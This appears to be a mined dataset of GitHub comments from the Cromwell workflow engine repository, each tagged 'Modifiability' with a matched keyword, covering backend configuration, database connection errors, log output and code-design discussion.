Modifiability,"BA will receive (Calls, workflowInputs, workflowOptions), config, serviceReg.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/604#issuecomment-205956569:58,config,config,58,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/604#issuecomment-205956569,1,['config'],['config']
Modifiability,"BA-6088 mentions `carboniter-start-date` config field, however in this PR `minimum-summary-entry-id` numeric field is used instead. This is a little confusing. ; Also, what is the reason for using `minimum-summary-entry-id` in favor of date?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5267#issuecomment-551280306:41,config,config,41,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5267#issuecomment-551280306,1,['config'],['config']
Modifiability,BC4Connection.java:47); 	at sun.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method); 	at sun.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:62); 	at sun.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45); 	at java.lang.reflect.Constructor.newInstance(Constructor.java:422); 	at com.mysql.jdbc.Util.handleNewInstance(Util.java:425); 	at com.mysql.jdbc.ConnectionImpl.getInstance(ConnectionImpl.java:389); 	at com.mysql.jdbc.NonRegisteringDriver.connect(NonRegisteringDriver.java:330); 	at com.zaxxer.hikari.util.DriverDataSource.getConnection(DriverDataSource.java:95); 	at com.zaxxer.hikari.util.DriverDataSource.getConnection(DriverDataSource.java:101); 	at com.zaxxer.hikari.pool.PoolBase.newConnection(PoolBase.java:341); 	at com.zaxxer.hikari.pool.PoolBase.newPoolEntry(PoolBase.java:193); 	at com.zaxxer.hikari.pool.HikariPool.createPoolEntry(HikariPool.java:430); 	at com.zaxxer.hikari.pool.HikariPool.access$500(HikariPool.java:64); 	at com.zaxxer.hikari.pool.HikariPool$PoolEntryCreator.call(HikariPool.java:570); 	at com.zaxxer.hikari.pool.HikariPool$PoolEntryCreator.call(HikariPool.java:563); 	at java.util.concurrent.FutureTask.run(FutureTask.java:266); 	... 3 more; Caused by: java.net.ConnectException: Connection refused; 	at java.net.PlainSocketImpl.socketConnect(Native Method); 	at java.net.AbstractPlainSocketImpl.doConnect(AbstractPlainSocketImpl.java:350); 	at java.net.AbstractPlainSocketImpl.connectToAddress(AbstractPlainSocketImpl.java:206); 	at java.net.AbstractPlainSocketImpl.connect(AbstractPlainSocketImpl.java:188); 	at java.net.SocksSocketImpl.connect(SocksSocketImpl.java:392); 	at java.net.Socket.connect(Socket.java:589); 	at com.mysql.jdbc.StandardSocketFactory.connect(StandardSocketFactory.java:211); 	at com.mysql.jdbc.MysqlIO.<init>(MysqlIO.java:300); 	... 24 more; ```; How can I properly configure the database to work properly in the local command? Thank you!,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3387#issuecomment-372264453:6847,config,configure,6847,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3387#issuecomment-372264453,1,['config'],['configure']
Modifiability,BT heard from Sri over old school email that:. > Looks like we can provide full network and subnet paths in the config. This would definitely work for us. Merging,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6476#issuecomment-906856722:112,config,config,112,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6476#issuecomment-906856722,1,['config'],['config']
Modifiability,"BTW, I changed the config above because the only viable way to implement a lock in singularity is one lock per cache. If two images that are different but with shared layers are written to the cache, it can still become corrupted!. @TMiguelT This will be hard to pull of in the code because the runtime attributes are evaluated just before task submissions (not before scattering). Also there will still be race conditions. Only one process should pull to the same cache at the same time. This is because images have shared layers. Also this requires additional code and is only applicable to the singularity use case. The few lines in the script are way way way less than any code that would be required to make this happen. As regards tot he messy bash, no bash is required. Flock + the pull command is just one line. The only bash that is required is to set a few variables, but that is not really scripting. Flock is a great solution. Thanks a lot for suggesting it! The only better solution would have been that singularity has implemented such a filelock itself. As long as the pull process happens on the same node, the kernel will ensure that there are no race conditions. Of course this doesn't work on another node, so the flock command should be placed before the submit command.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5063#issuecomment-627835781:19,config,config,19,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5063#issuecomment-627835781,4,"['config', 'layers', 'variab']","['config', 'layers', 'variables']"
Modifiability,"Based on the need for this use case, I strongly support merging this (or some) basic configuration, and then having documentation with a writeup about these different use cases. @TMiguelT you are spot on about creating the image before hand, and don't forget that in addition to build (which most users might not be able to do on their cluster) you can also just pull from docker:. ```bash; singularity pull docker://<container>; ```; and then create a binary (singularity image) that can be given directly to the run/exec command.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-461444105:85,config,configuration,85,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-461444105,1,['config'],['configuration']
Modifiability,"Be able to parse a config like. ``` hocon; backend {; default = ""local""; providers = [; {; name = ""local""; initClass = ""cromwell.engine.backend.local.LocalBackend""; },; {; name = ""jes""; initClass = ""cromwell.engine.backend.jes.JesBackend""; }; ]; }; ```. Treat `BackendConfiguration` as the canonical registry of backends, disclaiming knowledge of backends not mentioned in the config even if they're actually compiled into Cromwell.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/580#issuecomment-198088351:19,config,config,19,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/580#issuecomment-198088351,2,['config'],['config']
Modifiability,"Better still, we'd like to either:. 1) add `cloud-platform` scope, which would allow calling _any_ Google APIs. I understand this may not bode well with the current security model used in Firecloud; however, Google itself recommends migrating away from scopes in favor of IAM, as scopes were introduced before IAM existed [1]. 2) make scopes configurable, ideally at the workflow level, or at least at Cromwell config level. There may be a set of obligatory scopes that is hard-coded in Cromwell (e.g. `genomics` or `compute`), and then `additionalScopes` specified via configuration. This way, we satisfy both the need to restrict the scopes by default, and address other use cases when needed. Our ideal picture for this is that we'd be able to call any Google APIs (e.g. Pub/Sub, Firestore, or BigQuery) from workflows running on CaaS. We don't want to ""wait"" for a new scope to be added upstream each time we have to call a new API. Thanks!. [1] https://cloud.google.com/compute/docs/access/create-enable-service-accounts-for-instances#best_practices",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4115#issuecomment-424583308:342,config,configurable,342,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4115#issuecomment-424583308,3,['config'],"['config', 'configurable', 'configuration']"
Modifiability,"But the job ran successfully. Here is the full logs:. [ec2-user@ip-10-80-199-174 ~]$ java -Dconfig.file=aws.callcache.conf -jar ~/cromwell-35.jar run -i hello_inputs.json hello.wdl; [2018-11-21 15:08:54,14] [info] Running with database db.url = jdbc:mysql://cromwell-db-rdscluster-6zlvcyvtarfq.cluster-ct1b0hjjpe9q.us-east-1.rds.amazonaws.com/cromwell; [2018-11-21 15:09:03,32] [info] Running with database db.url = jdbc:mysql://cromwell-db-rdscluster-6zlvcyvtarfq.cluster-ct1b0hjjpe9q.us-east-1.rds.amazonaws.com/cromwell; [2018-11-21 15:09:03,62] [warn] Unrecognized configuration key(s) for AwsBatch: auth, numCreateDefinitionAttempts, numSubmitAttempts; [2018-11-21 15:09:03,91] [info] Slf4jLogger started; [2018-11-21 15:09:04,16] [info] Workflow heartbeat configuration:; {; ""cromwellId"" : ""cromid-23ba05a"",; ""heartbeatInterval"" : ""2 minutes"",; ""ttl"" : ""10 minutes"",; ""writeBatchSize"" : 10000,; ""writeThreshold"" : 10000; }; [2018-11-21 15:09:04,43] [info] Metadata summary refreshing every 2 seconds.; [2018-11-21 15:09:04,51] [info] KvWriteActor configured to flush with batch size 200 and process rate 5 seconds.; [2018-11-21 15:09:04,53] [info] WriteMetadataActor configured to flush with batch size 200 and process rate 5 seconds.; [2018-11-21 15:09:04,60] [info] CallCacheWriteActor configured to flush with batch size 100 and process rate 3 seconds.; [2018-11-21 15:09:05,40] [info] JobExecutionTokenDispenser - Distribution rate: 50 per 1 seconds.; [2018-11-21 15:09:05,44] [info] SingleWorkflowRunnerActor: Version 35; [2018-11-21 15:09:05,44] [info] SingleWorkflowRunnerActor: Submitting workflow; [2018-11-21 15:09:05,51] [info] Unspecified type (Unspecified version) workflow 02306258-436a-4372-ab54-2dcd83c42b47 submitted; [2018-11-21 15:09:05,52] [info] SingleWorkflowRunnerActor: Workflow submitted 02306258-436a-4372-ab54-2dcd83c42b47; [2018-11-21 15:09:05,53] [info] 1 new workflows fetched; [2018-11-21 15:09:05,53] [info] WorkflowManagerActor Starting workflow 02306258-436a-43",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4412#issuecomment-440793421:569,config,configuration,569,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4412#issuecomment-440793421,2,['config'],['configuration']
Modifiability,"By the way, there are 2 `var`s in this PR, this is because I extended the Java `ExponentialBackoff.Builder` class to add the initial gap, and thought it would be better to keep the same ""Java"" style it already has (set/get).; If people fell the urge to scream please do so now :p",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/389#issuecomment-173351761:61,extend,extended,61,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/389#issuecomment-173351761,1,['extend'],['extended']
Modifiability,"CWL --type-version v1.0 --workflow-root main; [2018-10-23 17:48:48,28] [info] Running with database db.url = jdbc:hsqldb:mem:3bd78058-b880-451a-b3ef-71a48a2a17ce;shutdown=false;hsqldb.tx=mvcc; [2018-10-23 17:48:55,34] [info] Running migration RenameWorkflowOptionsInMetadata with a read batch size of 100000 and a write batch size of 100000; [2018-10-23 17:48:55,36] [info] [RenameWorkflowOptionsInMetadata] 100%; [2018-10-23 17:48:55,49] [info] Running with database db.url = jdbc:hsqldb:mem:35603602-72c4-4c47-8662-7fdf49e59cf1;shutdown=false;hsqldb.tx=mvcc; [2018-10-23 17:48:55,95] [info] Slf4jLogger started; [2018-10-23 17:48:56,03] [info] Pre Processing Workflow...; [2018-10-23 17:48:56,20] [info] Pre-Processing /home/jeremiah/code/gdc-dnaseq-cwl/workflows/bamfastq_align/test_pack.cwl; [2018-10-23 17:49:21,60] [info] Pre Processing Inputs...; [2018-10-23 17:49:21,78] [info] Workflow heartbeat configuration:; {; ""cromwellId"" : ""cromid-5deb9cb"",; ""heartbeatInterval"" : ""2 minutes"",; ""ttl"" : ""10 minutes"",; ""writeBatchSize"" : 10000,; ""writeThreshold"" : 10000; }; [2018-10-23 17:49:21,93] [info] Metadata summary refreshing every 2 seconds.; [2018-10-23 17:49:22,12] [info] KvWriteActor configured to flush with batch size 200 and process rate 5 seconds.; [2018-10-23 17:49:22,13] [info] WriteMetadataActor configured to flush with batch size 200 and process rate 5 seconds.; [2018-10-23 17:49:22,22] [info] CallCacheWriteActor configured to flush with batch size 100 and process rate 3 seconds.; [2018-10-23 17:49:23,62] [info] JobExecutionTokenDispenser - Distribution rate: 50 per 1 seconds.; [2018-10-23 17:49:23,67] [info] SingleWorkflowRunnerActor: Version 37-634ac5b-SNAP; [2018-10-23 17:49:23,68] [info] SingleWorkflowRunnerActor: Submitting workflow; [2018-10-23 17:49:23,76] [info] CWL (v1.0) workflow d186ca94-b85b-4729-befc-8ad28a05976c submitted; [2018-10-23 17:49:23,80] [info] SingleWorkflowRunnerActor: Workflow submitted d186ca94-b85b-4729-befc-8ad28a05976c; [2018-10-23 17:4",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4103#issuecomment-432449856:2553,config,configuration,2553,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4103#issuecomment-432449856,1,['config'],['configuration']
Modifiability,"Can you add a spec to `SlickDataAccessSpec`, that consists of a `WdlArray(WdlArrayType(WdlStringType), Seq(WdlString(""."" * 10000)))`, populating and then reading the symbol row?. It can just be slightly modified version of the spec ""get a symbol input"". You can even change the one that's there if you'd like, or clone it, parameterize it, etc.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/113#issuecomment-124210947:323,parameteriz,parameterize,323,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/113#issuecomment-124210947,1,['parameteriz'],['parameterize']
Modifiability,"Can you upload the complete stack trace from the cromwell-log?. On Fri, Feb 14, 2020 at 9:29 AM pjongeneel <notifications@github.com> wrote:. > I have /mnt/efs on both batch nodes and cromwell server which is the; > mounted EFS.; >; > Then; > backend {; > // this configures the AWS Batch Backend for Cromwell; > default = ""AWSBATCH""; > providers {; > AWSBATCH {; > actor-factory =; > ""cromwell.backend.impl.aws.AwsBatchBackendLifecycleActorFactory""; > config {; > root = ""/mnt/efs/cromwell_execution""; > auth = ""default""; >; > numSubmitAttempts = 3; > numCreateDefinitionAttempts = 3; >; > default-runtime-attributes {; > queueArn: ""${BatchQueue}""; > }; >; > filesystems {; > local { auth = ""default"" }; > }; > }; > }; >; > }; > }; >; > And I always get this error:; > ERROR - AwsBatchAsyncBackendJobExecutionActor; > [UUID(8512304b)bioinfx.testjob:NA:1]: Error attempting to Execute; > java.util.NoSuchElementException: None.get; >; > —; > You are receiving this because you were mentioned.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/pull/5070?email_source=notifications&email_token=ALILATR2AVXQXLFRQKER6W3RC3IIXA5CNFSM4IBORPI2YY3PNVWWK3TUL52HS4DFVREXG43VMVBW63LNMVXHJKTDN5WW2ZLOORPWSZGOELZZF7A#issuecomment-586388220>,; > or unsubscribe; > <https://github.com/notifications/unsubscribe-auth/ALILATWPGUN66MUEOCVPYULRC3IIXANCNFSM4IBORPIQ>; > .; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5070#issuecomment-586395015:264,config,configures,264,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5070#issuecomment-586395015,2,['config'],"['config', 'configures']"
Modifiability,"Can-of-wormsy ToL: if `reference.conf` doubles as our config documentation, could we include this there? Otherwise, could we write it down *somewhere*?. I like not cluttering the `reference.conf` but I also don't want to have to rummage through some (I've-already-forgotten-which) class file to find how to change this.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2470#issuecomment-316724933:54,config,config,54,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2470#issuecomment-316724933,1,['config'],['config']
Modifiability,"Centaur test failure was in an unrelated test (see below, https://broadworkbench.atlassian.net/browse/CROM-6744). The tests that I modified passed, and I am rerunning the failed stage. Unexpected terminal status Failed while waiting for one of [Running, Succeeded] (workflow ID: a4d90928-3f33-4be6-87d7-a3d01a0b73[...]); 19:12:57.605 [daemonpool-thread-43] INFO centaur.api.CentaurCromwellClient$ - Submitting cwl_relative_imports_url returned workflow id 39a765a7-4294-4da4-a059-5204d29a5abf; 19:13:02.771 [pool-3-thread-1] ERROR centaur.reporting.Slf4jReporter - Test 'successfully run cwl_relative_imports_url' failed on attempt 3 of 3 with workflow id '39a765a7-4294-4da4-a059-5204d29a5abf' ; centaur.test.CentaurTestException: Unexpected terminal status Failed while waiting for one of [Running, Succeeded] (workflow ID: 39a765a7-4294-4da4-a059-5204d29a5abf); 	at centaur.test.CentaurTestException$.apply(CentaurTestException.scala:34); 	at centaur.test.Operations$$anon$15.$anonfun$status$2(Test.scala:294); 	at centaur.test.Operations$$anon$15.$anonfun$status$2$adapted(Test.scala:292)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6557#issuecomment-961386499:1069,adapt,adapted,1069,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6557#issuecomment-961386499,1,['adapt'],['adapted']
Modifiability,"Closing this; I [added a cromwell recipe to bioconda](https://github.com/bioconda/bioconda-recipes/pull/2348), so now it is possible to `conda install cromwell` (if you have the bioconda channel in your config). See here for more info:; https://bioconda.github.io/recipes/cromwell/README.html",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1446#issuecomment-248438503:203,config,config,203,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1446#issuecomment-248438503,1,['config'],['config']
Modifiability,Comments apply to both this and #812: . Currently there is no format checking of any of the content in the `config {...}` sections for either Local or JES PBE. The respective backend impls assume the keys are present and the values have the expected shapes.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/811#issuecomment-218773899:108,config,config,108,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/811#issuecomment-218773899,1,['config'],['config']
Modifiability,Comments from the FireCloud/GOTC beta test experience. > Workflow options file key change: Had to change defaultRuntimeOptions to default_runtime_attributes.; > Cromwell config typo: Had to change JesBackendLifecycleFactory to JesBackendLifecycleActorFactory.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1120#issuecomment-232426738:170,config,config,170,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1120#issuecomment-232426738,1,['config'],['config']
Modifiability,Config is managed here: https://github.com/broadinstitute/firecloud-develop/blob/dev/base-configs/cromwell/cromwell.conf.ctmpl,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6959#issuecomment-1333846682:0,Config,Config,0,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6959#issuecomment-1333846682,2,"['Config', 'config']","['Config', 'configs']"
Modifiability,ConfigAsyncJobExecutionActor [UUID(c9194073)main:NA:1]: Error attempting to Execute; java.lang.Exception: Failed command instantiation; 	at cromwell.backend.standard.StandardAsyncExecutionActor.instantiatedCommand(StandardAsyncExecutionActor.scala:581); 	at cromwell.backend.standard.StandardAsyncExecutionActor.instantiatedCommand$(StandardAsyncExecutionActor.scala:515); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.instantiatedCommand$lzycompute(ConfigAsyncJobExecutionActor.scala:200); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.instantiatedCommand(ConfigAsyncJobExecutionActor.scala:200); 	at cromwell.backend.standard.StandardAsyncExecutionActor.commandScriptContents(StandardAsyncExecutionActor.scala:317); 	at cromwell.backend.standard.StandardAsyncExecutionActor.commandScriptContents$(StandardAsyncExecutionActor.scala:316); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.commandScriptContents(ConfigAsyncJobExecutionActor.scala:200); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.writeScriptContents(SharedFileSystemAsyncJobExecutionActor.scala:175); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.writeScriptContents$(SharedFileSystemAsyncJobExecutionActor.scala:174); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.cromwell$backend$sfs$BackgroundAsyncJobExecutionActor$$super$writeScriptContents(ConfigAsyncJobExecutionActor.scala:200); 	at cromwell.backend.sfs.BackgroundAsyncJobExecutionActor.writeScriptContents(BackgroundAsyncJobExecutionActor.scala:12); 	at cromwell.backend.sfs.BackgroundAsyncJobExecutionActor.writeScriptContents$(BackgroundAsyncJobExecutionActor.scala:11); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.writeScriptContents(ConfigAsyncJobExecutionActor.scala:200); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.execute(SharedFileSystemAsyncJobExecutionActor.s,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4725#issuecomment-472514211:1164,Config,ConfigAsyncJobExecutionActor,1164,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4725#issuecomment-472514211,1,['Config'],['ConfigAsyncJobExecutionActor']
Modifiability,"Configuring as you suggested (following the instructions on the provided URL) does not even start the process. Apart of some typos in the instructions (e.g., `MYPASSWORD` instead of `MYSQL_PASSWORD`), it looks that there is a conectivity problem with the docker container running mysql. Steps to reproduce:. ```bash; # start mysql-server container; docker run -p 3306:3306 --name cromwell_db -e MYSQL_ROOT_PASSWORD=`cat my_sql.root.pwd` -e MYSQL_DATABASE=cromwell -e MYSQL_USER=cromwell -e MYSQL_PASSWORD=cromwell -d mysql/mysql-server:5.7; ```. The docker server is working and I can access the database using `docker exec -it cromwell_db mysql -u cromwell -p`. Adding to my configuration file:. ```; database {; profile = ""slick.jdbc.MySQLProfile$""; db {; driver = ""com.mysql.jdbc.Driver""; url = ""jdbc:mysql://localhost/cromwell?useSSL=false""; user = ""cromwell""; password = ""cromwell""; connectionTimeout = 5000; }; }; ```. And running locally:. ```bash; JAVA_OPTS=""-Dconfig.file=local.conf"" cromwell run --inputs inputs.json --metadata-output metadata-output.json workflow.wdl; ```. Produces the following log, which is the same even increasing the timeout:. ```; [2018-03-12 11:25:38,45] [info] Running with database db.url = jdbc:mysql://localhost/cromwell?useSSL=false; Exception in thread ""main"" java.lang.ExceptionInInitializerError; 	at cromwell.server.CromwellSystem.$init$(CromwellSystem.scala:24); 	at cromwell.CromwellEntryPoint$$anon$2.<init>(CromwellEntryPoint.scala:63); 	at cromwell.CromwellEntryPoint$.$anonfun$buildCromwellSystem$1(CromwellEntryPoint.scala:63); 	at scala.util.Try$.apply(Try.scala:209); 	at cromwell.CromwellEntryPoint$.buildCromwellSystem(CromwellEntryPoint.scala:63); 	at cromwell.CromwellEntryPoint$.runSingle(CromwellEntryPoint.scala:47); 	at cromwell.CommandLineParser$.runCromwell(CommandLineParser.scala:95); 	at cromwell.CommandLineParser$.delayedEndpoint$cromwell$CommandLineParser$1(CommandLineParser.scala:105); 	at cromwell.CommandLineParser$delayedInit$",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3387#issuecomment-372264453:0,Config,Configuring,0,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3387#issuecomment-372264453,2,"['Config', 'config']","['Configuring', 'configuration']"
Modifiability,Confirmed through manual testing with Cromwell and GCP Batch backend that providing just the `network-name` in the configuration works and is ok to leave off the `subnetwork-name`. I believe this can be a replacement in GCP Batch for the use of the `*` character for the region in the `subnetwork-name` that was used with PAPI.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7505#issuecomment-2346612179:115,config,configuration,115,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7505#issuecomment-2346612179,1,['config'],['configuration']
Modifiability,"Content seems good 👍 . ToL: If you don't want to in this PR, I might reorder this so that it goes from least-scary to most-scary, eg:. 1. How do I create my own configuration file for Cromwell; 1. A ""hello world"" example; 1. Description of all the options I can put in my configuration file; 1. What is reference.conf for and where is it?; 1. What is application.conf for and where is it?. Maybe with 2/3 swapped?. [![Approved with PullApprove](https://img.shields.io/badge/reviewers-approved-brightgreen.svg)](https://pullapprove.com/broadinstitute/cromwell/pull-request/2520/?utm_source=github-pr&utm_medium=comment-badge&utm_campaign=broadinstitute/cromwell)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2520#issuecomment-320297837:161,config,configuration,161,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2520#issuecomment-320297837,2,['config'],['configuration']
Modifiability,"Contradicting what I said in standup today, the performant rewrites of the labels query actually _*are*_ using the new non-unique key+value index I created on `CUSTOM_LABEL_ENTRY` (see the fourth row of the `EXPLAIN` above referencing `IDX_KEY_VALUE` as its `key`). I confirmed that without that index performance reverts to being terrible. The version of the query generated by Slick doesn't use the index and still performs terribly.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4598#issuecomment-459406199:59,rewrite,rewrites,59,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4598#issuecomment-459406199,1,['rewrite'],['rewrites']
Modifiability,"Cool -- so this is JDBC-batching effectively? It might be good to turn on SQL logging and check to see that the number of writes match what you think they should be. I remember @dvoet saying that the query rewrites weren't happening when they thought they should and that there was an option they had to set (either CloudSQL or Slick, can't remember). We should check in with him after break",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1810#issuecomment-269467766:206,rewrite,rewrites,206,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1810#issuecomment-269467766,1,['rewrite'],['rewrites']
Modifiability,Could be that @davidbernick has something to offer here for config/secrets management,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1296#issuecomment-315180988:60,config,config,60,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1296#issuecomment-315180988,1,['config'],['config']
Modifiability,Could you give a high-level overview of the changes here? Obviously the state machine is the star of this PR but there are quite a few changes in IWD and other spots where I wasn't expecting them. It looks like it's mostly a refactor but I'm not completely sure.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3350#issuecomment-370195869:225,refactor,refactor,225,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3350#issuecomment-370195869,1,['refactor'],['refactor']
Modifiability,Could you hold off a bit? There's an update in flight to the plugin.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2276#issuecomment-302112778:61,plugin,plugin,61,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2276#issuecomment-302112778,1,['plugin'],['plugin']
Modifiability,"Could you post the Cromwell configuration you're using ? Are the samples you're using relatively large?; I'm just wild guessing but one option would be that Cromwell is spending a lot of time trying to calculate md5 hashes for input files.; There's a configuration option to use file paths instead of file content to determine file equivalence for call caching purposes.; If you can make the assumptions that files are immutable and you don't go back and change their content manually this can be something to try.; To try that, you can update your Cromwell configuration: in the `backend.providers.SLURM.config` section (or whatever your backend is named instead of `SLURM`), and add this:; `filesystems.local.caching.hashing-strategy=""path""`; and this; `filesystems.local.caching.duplication-strategy=[""soft-link""]`. If possible I'd also recommend using a MySql DB instead of file based HSQL.; There are instructions here on how to do that in a few lines: http://cromwell.readthedocs.io/en/develop/tutorials/PersistentServer/#lets-get-started. Let me know if that makes any difference :)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3584#issuecomment-386406902:28,config,configuration,28,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3584#issuecomment-386406902,4,['config'],"['config', 'configuration']"
Modifiability,"Cromwell communicates with various gcloud endpoints. Instead of having N creds for N endpoints, sometimes Cromwell reuses creds for something else. For example: using the GCS creds for docker hash lookups [here](https://github.com/broadinstitute/cromwell/blob/78/supportedBackends/google/pipelines/common/src/main/scala/cromwell/backend/google/pipelines/common/PipelinesApiBackendLifecycleActorFactory.scala#L70-L82). This PR adds an optional config for reference disk validation auth falling back to the `genomics` auth that was used previously. One can then use USA authentication for individual genomics calls and a separate system SA for verifying which of the reference disks are valid (at startup).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6762#issuecomment-1127165933:443,config,config,443,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6762#issuecomment-1127165933,1,['config'],['config']
Modifiability,"Cromwell is not one of the repos with the newfangled auto-delete branch configured, fortunately.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7105#issuecomment-1554621295:72,config,configured,72,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7105#issuecomment-1554621295,1,['config'],['configured']
Modifiability,"Cromwell itself doesn't implement streaming for tasks in either WDL or CWL, mostly. The one exception, depending on how broadly one wants to define streaming, is Cromwell can understand a WDL ""hint"" (in quotes as there's not an official concept) that a cloud native path in a `File` variable can be handed directly to the task instead of converted to a local file on the POSIX filesystem. This is using the same sort of markup that DNANexus is using in the task metadata of the WDL.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3454#issuecomment-455542734:283,variab,variable,283,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3454#issuecomment-455542734,1,['variab'],['variable']
Modifiability,"Cromwell localizes every input file in the call directory when the task gets run. You can specify how it gets localized (soft-link, hard-link, copy) in the [configuration file](https://github.com/broadinstitute/cromwell/blob/develop/core/src/main/resources/application.conf#L148). Does this make your workflow / call fail ?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1140#issuecomment-231414741:157,config,configuration,157,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1140#issuecomment-231414741,1,['config'],['configuration']
